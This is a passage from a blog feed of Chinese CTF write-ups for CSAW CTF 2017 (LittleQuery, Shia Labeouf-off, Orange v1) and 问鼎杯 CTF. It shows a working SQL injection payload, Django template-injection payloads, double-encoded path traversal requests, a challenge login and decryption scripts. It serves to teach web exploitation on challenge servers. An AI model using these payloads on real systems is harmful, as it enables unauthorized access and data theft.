<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/18.png?raw=true" alt=""></p>
<p>不能直接显示。考虑到这是数据库的操作，可能会存在sql注入漏洞。尝试访问：<a href="http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&#39;&amp;table=user" target="_blank" rel="external">http://littlequery.chal.csaw.io/api/db_explore.php?mode=preview&amp;db=littlequery&#39;&amp;table=user</a>‘</p>
<p>可以看到单引号被加上了斜杠，同时知道是用反引号闭合的。根据上面两次操作，我们推测服务器后端大概是这样写的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">...</div><div class="line">$mode = $_GET[<span class="string">'mode'</span>];</div><div class="line">$db = <span class="keyword">isset</span>($_GET[<span class="string">'db'</span>])? addslashes($_GET[<span class="string">'db'</span>]):<span class="string">''</span>;</div><div class="line">$table = <span class="keyword">isset</span>($_GET[<span class="string">'table'</span>])? addslashes($_GET[<span class="string">'table'</span>]):<span class="string">''</span>;</div><div class="line"><span class="keyword">if</span> ($mode == <span class="string">'preview'</span>)&#123;</div><div class="line">	<span class="keyword">if</span> ($db &amp;&amp; $table)&#123;</div><div class="line">		<span class="keyword">if</span> ($db === <span class="string">'littlequery'</span>)</div><div class="line">			<span class="keyword">die</span>(<span class="string">"Database 'littlequery' is not allowed to be previewed."</span>);</div><div class="line">		$sql = <span class="string">"select * from `$db`.`$table`"</span>;</div><div class="line">		db-&gt;query($sql);</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Must provide db and table to preview data"</span>;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>目的是要查出 littlequery.user 中的数据，所以利用反引号闭合，传入的<code>db</code>参数为：<code>littlequery`.`user`%23</code>。<code>table</code>参数随意，比如字母a。则传入后构造出来的sql语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from `littlequery`.`user`%23`.`a`</div></pre></td></tr></table></figure></p>
<p>则在<code>%23</code>后的将会被注释掉，同时又能过掉服务器端关于<code>$db === &#39;littlequery&#39;</code>的检测。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/20.png?raw=true" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[&#123;&quot;uid&quot;:&quot;1&quot;,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;5896e92d38ee883cc09ad6f88df4934f6b074cf8&quot;&#125;]</div></pre></td></tr></table></figure></p>
<p>回到 <a href="http://littlequery.chal.csaw.io/login.php" target="_blank" rel="external">http://littlequery.chal.csaw.io/login.php</a> ，直接登陆失败。看一下前面的login.js，会先把输入的密码进行一次<code>CryptoJS.SHA1</code>加密后再发送。而我们注出来的密码应该是原密码经过<code>CryptoJS.SHA1</code>加密后的结果，应该所以应该先抓包，修改password为”5896…”<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/22.png?raw=true" alt=""></p>
<p>出现了302跳转，follow：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/23.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CSAW CTF 2017-LittleQuery-writeup&lt;br&gt;SQL注入漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF 2017-Shia Labeouf-off-writeup</title>
    <link href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/"/>
    <id>http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Shia-Labeouf-off-writeup/</id>
    <published>2017-09-18T05:50:16.000Z</published>
    <updated>2017-09-19T15:44:16.721Z</updated>
    
    <content type="html"><![CDATA[<p>CSAW CTF 2017-Shia Labeouf-off-writeup<br>SSTI Django-debug<br><a id="more"></a><br>根据wp复现。</p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Do it</div><div class="line">Just do it</div><div class="line">Don&apos;t let your dreams be dreams</div><div class="line">Yesterday you said tomorrow</div><div class="line">So just do it</div><div class="line">Make your dreams come true</div><div class="line">Just do it</div><div class="line">Pick 1: http://web.chal.csaw.io:5487 http://web.chal.csaw.io:5488 http://web.chal.csaw.io:5489 http://web.chal.csaw.io:5490</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>用awvs扫了一下，发现Django的debug模式没有关闭</p>
<p>比如访问: <a href="http://web.chal.csaw.io:5487/polls/4/" target="_blank" rel="external">http://web.chal.csaw.io:5487/polls/4/</a> ，给出的DEBUG页面里有很多重要的信息。</p>
<p><code>./polls/views.py</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></div><div class="line">    latest_poll_list = Poll.objects.all().order_by(<span class="string">'-pub_date'</span>)[:<span class="number">5</span>]</div><div class="line">    context = &#123;<span class="string">'latest_poll_list'</span>: latest_poll_list[<span class="number">1</span>:<span class="number">3</span>]&#125;</div><div class="line">    <span class="keyword">return</span> render(request, <span class="string">'polls/index.html'</span>, context)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">detail</span><span class="params">(request, poll_id)</span>:</span></div><div class="line">    <span class="keyword">if</span> int(poll_id) &gt; <span class="number">3</span>:</div><div class="line">        <span class="keyword">return</span> render(request, <span class="string">'polls/detail.html'</span>, &#123;<span class="string">'poll'</span>: &#123;<span class="string">"id"</span>: int(poll_id), <span class="string">"question"</span>: <span class="string">"ahhhhh"</span>&#125;&#125;)</div><div class="line">    poll = get_object_or_404(Poll, pk=poll_id)</div><div class="line">    <span class="keyword">return</span> render(request, <span class="string">'polls/detail.html'</span>, &#123;<span class="string">'poll'</span>: poll&#125;)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">results</span><span class="params">(request, poll_id)</span>:</span></div><div class="line">    poll = get_object_or_404(Poll, pk=poll_id)</div><div class="line">    <span class="keyword">return</span> render(request, <span class="string">'polls/results.html'</span>, &#123;<span class="string">'poll'</span>: poll&#125;)</div></pre></td></tr></table></figure></p>
<p><code>./polls/templatetags/pools_extras.py</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">  <span class="keyword">return</span> getattr(value, arg)</div><div class="line"></div><div class="line"><span class="meta">@register.filter(name='checknum')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">checknum</span><span class="params">(value)</span>:</span></div><div class="line">  check(value)</div><div class="line"></div><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">return</span> dir(value)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">if</span> value &gt; <span class="number">2</span>:</div><div class="line">  	<span class="keyword">raise</span> Exception(<span class="string">"Our infrastructure can't support that many Shias!"</span>)</div></pre></td></tr></table></figure></p>
<p>在 <a href="http://web.chal.csaw.io:5487/ad-lib/" target="_blank" rel="external">http://web.chal.csaw.io:5487/ad-lib/</a> 页面存在SSTI漏洞。由于Django的DEBUG模式开启，模板会存在内置的tab；<a href="https://docs.djangoproject.com/en/dev/ref/templates/builtins/#debug" target="_blank" rel="external"><code>\{\% debug \%\}</code></a>：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/6.png?raw=true" alt=""></p>
<p>它会输出页面的debug信息，包括当前的上下文和导入的模块。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/7.png?raw=true" alt=""><br>对比前面的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Where you want a noun, just put: &quot;&#123;&#123; noun &#125;&#125;&quot;, for a verb: &quot;&#123;&#123; verb &#125;&#125;&quot;, and for an adjective: &quot;&#123;&#123; adjective &#125;&#125;&quot;!</div></pre></td></tr></table></figure></p>
<p>会注意到一个与众不同的变量/模块<code>mrpoopy</code>。</p>
<p>考虑到前面我们通过报错获取到的部分代码，在<code>./polls/templatetags/pools_extras.py</code>中，有这样一个<a href="http://docs.jinkan.org/docs/jinja2/templates.html#filters" target="_blank" rel="external">过滤器</a>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='listme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listme</span><span class="params">(value)</span>:</span></div><div class="line">  <span class="keyword">return</span> dir(value)</div></pre></td></tr></table></figure></p>
<p>当我们传入的变量为：<code>mrpoopy | listme</code>，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/8.png?raw=true" alt=""></p>
<p>后端会调用<code>dir(mrpoopy)</code>并返回。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/9.png?raw=true" alt=""></p>
<p>在<code>./polls/templatetags/pools_extras.py</code>，还有另外一个<a href="http://docs.jinkan.org/docs/jinja2/templates.html#filters" target="_blank" rel="external">过滤器</a>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@register.filter(name='getme')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getme</span><span class="params">(value, arg)</span>:</span></div><div class="line">  <span class="keyword">return</span> getattr(value, arg)</div></pre></td></tr></table></figure></p>
<p>当我们传入：<code>\{\{mrpoopy|getme:&quot;__flag__&quot;\}\}</code>，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/10.png?raw=true" alt=""></p>
<p>经过过滤器，会调用<code>getme(mrpoopy,&quot;__flag__&quot;)</code>，也就是调用<code>getattr(mrpoopy,&quot;__flag__&quot;)</code>，从而返回mrpoopy的<code>__flag__</code>属性的值。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/11.png?raw=true" alt=""></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://docs.djangoproject.com/en/dev/ref/templates/builtins/#debug" target="_blank" rel="external">Django:Built-in template tags and filters</a></li>
<li><a href="http://python.usyiyi.cn/translate/django_182/howto/custom-template-tags.html" target="_blank" rel="external">Django:自定义模板标签和过滤器</a></li>
<li><a href="https://gxnotes.com/article/106333.html" target="_blank" rel="external">Django调试显示页面的所有变量</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CSAW CTF 2017-Shia Labeouf-off-writeup&lt;br&gt;SSTI Django-debug&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CSAW CTF 2017-Orange v1-writeup</title>
    <link href="http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/"/>
    <id>http://chybeta.github.io/2017/09/18/CSAW-CTF-2017-Orange-v1-writeup/</id>
    <published>2017-09-18T05:46:28.000Z</published>
    <updated>2017-09-19T15:33:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>CSAW CTF 2017-Orange v1-writeup<br>文件读取漏洞<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">I wrote a little proxy program in NodeJS for my poems folder.</div><div class="line">Everyone wants to read flag.txt but I like it too much to share.</div><div class="line">http://web.chal.csaw.io:7311/?path=orange.txt</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>若将path参数放空，即 <a href="http://web.chal.csaw.io:7311/?path=" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/1.png?raw=true" alt=""></p>
<p>没有flag.txt，所以需要想办法“遍历”一下目录。</p>
<p>尝试访问: <a href="http://web.chal.csaw.io:7311/?path=../" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=../</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/2.png?raw=true" alt=""></p>
<p>考虑到可能有二次编码的问题，<code>.</code> =&gt; <code>%2e</code> =&gt; <code>%252e</code>，访问：<a href="http://web.chal.csaw.io:7311/?path=%252e%252e/" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=%252e%252e/</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/3.png?raw=true" alt=""></p>
<p>最后访问:　<a href="http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt" target="_blank" rel="external">http://web.chal.csaw.io:7311/?path=%252e%252e/flag.txt</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170918/4.png?raw=true" alt=""></p>
<p>读取到一些源文件，如下：</p>
<p>back.py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> SimpleHTTPServer</div><div class="line"><span class="keyword">import</span> SocketServer</div><div class="line"></div><div class="line">PORT = <span class="number">8080</span></div><div class="line"></div><div class="line">Handler = SimpleHTTPServer.SimpleHTTPRequestHandler</div><div class="line"></div><div class="line">httpd = SocketServer.TCPServer((<span class="string">""</span>, PORT), Handler)</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"Serving at port"</span>, PORT</div><div class="line">httpd.serve_forever()</div></pre></td></tr></table></figure></p>
<p>serve.sh:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/env bash</span></div><div class="line"></div><div class="line">python back.py &amp;</div><div class="line">nodejs server.js</div></pre></td></tr></table></figure></p>
<p>server.js:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> server = http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> path = url.parse(req.url, <span class="literal">true</span>).query;</div><div class="line">        path = path[<span class="string">'path'</span>];</div><div class="line">        <span class="keyword">if</span> (path.indexOf(<span class="string">".."</span>) == <span class="number">-1</span> &amp;&amp; path.indexOf(<span class="string">"ＮＮ"</span>) == <span class="number">-1</span>) &#123;</div><div class="line">            <span class="keyword">var</span> base = <span class="string">"http://localhost:8080/poems/"</span>;</div><div class="line">            <span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> str = <span class="string">''</span>;</div><div class="line">                response.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chunk</span>) </span>&#123;</div><div class="line">                    str += chunk;</div><div class="line">                &#125;);</div><div class="line">                response.on(<span class="string">'end'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                  res.end(str);</div><div class="line">                &#125;);</div><div class="line">            &#125;</div><div class="line">            http.get(base + path, callback).end();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            res.writeHead(<span class="number">403</span>);</div><div class="line">            res.end(<span class="string">"WHOA THATS BANNED!!!!"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">catch</span> (e) &#123;</div><div class="line">        res.writeHead(<span class="number">404</span>);</div><div class="line">        res.end(<span class="string">'Oops'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;);</div><div class="line">server.listen(<span class="number">9999</span>);</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CSAW CTF 2017-Orange v1-writeup&lt;br&gt;文件读取漏洞&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>问鼎杯 CTF writeup</title>
    <link href="http://chybeta.github.io/2017/09/16/%E9%97%AE%E9%BC%8E%E6%9D%AF-CTF-writeup/"/>
    <id>http://chybeta.github.io/2017/09/16/问鼎杯-CTF-writeup/</id>
    <published>2017-09-16T04:41:43.000Z</published>
    <updated>2017-09-18T05:18:44.623Z</updated>
    
    <content type="html"><![CDATA[<p>问鼎杯 CTF writeup<br><a id="more"></a><br>队伍：Ph0en1x</p>
<h1 id="1-1"><a href="#1-1" class="headerlink" title="1.1"></a>1.1</h1><p><a href="http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2016.999999999999999" target="_blank" rel="external">http://sec2.hdu.edu.cn/84cdc76cabf41bd7c961f6ab12f117d8/?year=2016.999999999999999</a></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WDFLAG=&#123;9c318582f7d864a9b4f9fcaab71657ce&#125;</div></pre></td></tr></table></figure></p>
<h1 id="1-2"><a href="#1-2" class="headerlink" title="1.2"></a>1.2</h1><p>返回的页面头里有一个账号信息，用户名为：Voldemort，密码为：123456。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/8.png?raw=true" alt=""></p>
<p>登陆后有个management。点击后跳转到：<a href="http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/admin.php" target="_blank" rel="external">http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/admin.php</a><br>查看源代码，有个js：<a href="http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/js/wdctffunction.js" target="_blank" rel="external">http://sec2.hdu.edu.cn/c8bbe67803085b9e51b69b6d6cff821c/js/wdctffunction.js</a></p>
<p>f12打开，控制台下getSecret():<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/9.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wdctf&#123;rev3aled_j3_funct10ns&#125;</div></pre></td></tr></table></figure></p>
<h1 id="2-1"><a href="#2-1" class="headerlink" title="2.1"></a>2.1</h1><p>后台地址： <a href="http://sec5.hdu.edu.cn/fuckme/login.php" target="_blank" rel="external">http://sec5.hdu.edu.cn/fuckme/login.php</a></p>
<p>社工后，用户名：847085251@qq.com ，密码：NB51A5</p>
<p>登陆后在未审核邮箱处找到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/10.png?raw=true" alt=""></p>
<p>访问：<a href="http://sec5.hdu.edu.cn/b7010bcfcdb62922d4e4a5ec8d79fb33.php" target="_blank" rel="external">http://sec5.hdu.edu.cn/b7010bcfcdb62922d4e4a5ec8d79fb33.php</a><br>跳转到：<a href="http://sec1.hdu.edu.cn/web/ww9ebmxnf1tlkn1d" target="_blank" rel="external">http://sec1.hdu.edu.cn/web/ww9ebmxnf1tlkn1d</a></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WDFLAG=&#123;b3057d3283090fc160d999d272f20e44&#125;</div></pre></td></tr></table></figure></p>
<h1 id="3-1"><a href="#3-1" class="headerlink" title="3.1"></a>3.1</h1><p>题目提供了一个 <code>++__++</code>文件，在kali下自动显示为一个压缩包，提取后得到一个<code>++__++</code>文件，发现是pcap。用wireshark打开。通过自带的导出功能，得到三个文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/5.png?raw=true" alt=""></p>
<p>但flag.rar被加密了无法直接解开。追踪一下tcp流，发现一个奇怪的字符串，直接用base64解是乱码。在它下面有一个py脚本。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/6.png?raw=true" alt=""></p>
<p>经过一番调试，最后解密脚本修正如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> base64</div><div class="line">IV = <span class="string">'QWERTYUIOPASDFGH'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted)</span>:</span></div><div class="line">  aes = AES.new(IV, AES.MODE_CBC, IV)</div><div class="line">  <span class="keyword">return</span> aes.decrypt(encrypted)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message)</span>:</span></div><div class="line">  length = <span class="number">16</span></div><div class="line">  count = len(message)</div><div class="line">  padding = length - (count % length)</div><div class="line">  message = message + <span class="string">'\0'</span> * padding</div><div class="line">  aes = AES.new(IV, AES.MODE_CBC, IV)</div><div class="line">  <span class="keyword">return</span> aes.encrypt(message)</div><div class="line"></div><div class="line">print(decrypt(base64.b64decode(<span class="string">"19aaFYsQQKr+hVX6hl2smAUQ5a767TsULEUebWSajEo="</span>)))</div></pre></td></tr></table></figure></p>
<p>运行后得到：passwd={No_One_Can_Decrypt_Me}。用于flag.rar的解密，得到最后的flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">WDCTF&#123;Seclab_CTF_2017&#125;</div></pre></td></tr></table></figure></p>
<h1 id="3-2"><a href="#3-2" class="headerlink" title="3.2"></a>3.2</h1><p>给了一张gif图片。<a href="https://ezgif.com/" target="_blank" rel="external">https://ezgif.com/</a> 分解出四帧，然后ps将其拼接。得到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/1.png?raw=true" alt=""></p>
<p>扫描后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">03f30d0ab8c1aa596300000000000000000200000040000000732e0000006400006401006c00005a00006402005a01006403005a02006404008400005a03006405008400005a040064010053280600000069ffffffff4e7403000000637466733d0000003138362c39382c3138302c3135342c3133392c3139322c3131342c31342c3130322c3136382c34332c3133362c35322c3231382c38352c3130302c3433630200000004000000070000004300000073610000007400006a01007c0100830100016401007d02007838007c0000445d30007d03007c02007402007403007c03008301007400006a04006402006403008302004183010064040017377d0200711a00577c02006a05006404008301007d02007c02005328050000004e7400000000690000000069ff00000074010000002c2806000000740600000072616e646f6d740400000073656564740300000073747274030000006f7264740700000072616e64696e7474050000007374726970280400000074040000007374723174030000006b65797404000000737472327401000000632800000000280000000073100000002f686f6d652f6374662f6262622e7079740500000066756e633107000000730c00000000010d0106010d012e010f016302000000040000000700000043000000735d0000007400006a01007c0100830100016401007d02007843007c00006a0200640200830100445d32007d03007403007c03008301007d03007c02007404007c03007400006a050064030064040083020041830100377d0200712300577c02005328050000004e52010000005202000000690000000069ff000000280600000052030000005204000000740500000073706c69747403000000696e74740300000063687252070000002804000000520b000000520a00000052090000007401000000692800000000280000000073100000002f686f6d652f6374662f6262622e7079740500000066756e63320f000000730c00000000010d01060116010c01240128050000005203000000520a000000740400000073747272520d000000521200000028000000002800000000280000000073100000002f686f6d652f6374662f6262622e707974080000003c6d6f64756c653e0100000073080000000c02060106030908</div></pre></td></tr></table></figure></p>
<p>用hex编辑器保存为pyc文件，反汇编后得到py：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="comment"># 访问 http://tool.lu/pyc/ 查看更多信息</span></div><div class="line"><span class="keyword">import</span> random</div><div class="line">key = <span class="string">'ctf'</span></div><div class="line">strr = <span class="string">'186,98,180,154,139,192,114,14,102,168,43,136,52,218,85,100,43'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(str1, key)</span>:</span></div><div class="line">    random.seed(key)</div><div class="line">    str2 = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> str1:</div><div class="line">        str2 += str(ord(c) ^ random.randint(<span class="number">0</span>, <span class="number">255</span>)) + <span class="string">','</span></div><div class="line"></div><div class="line">    str2 = str2.strip(<span class="string">','</span>)</div><div class="line">    <span class="keyword">return</span> str2</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(str2, key)</span>:</span></div><div class="line">    random.seed(key)</div><div class="line">    str1 = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str2.split(<span class="string">','</span>):</div><div class="line">        i = int(i)</div><div class="line">        str1 += chr(i ^ random.randint(<span class="number">0</span>, <span class="number">255</span>))</div><div class="line"></div><div class="line">    <span class="keyword">return</span> str1</div></pre></td></tr></table></figure></p>
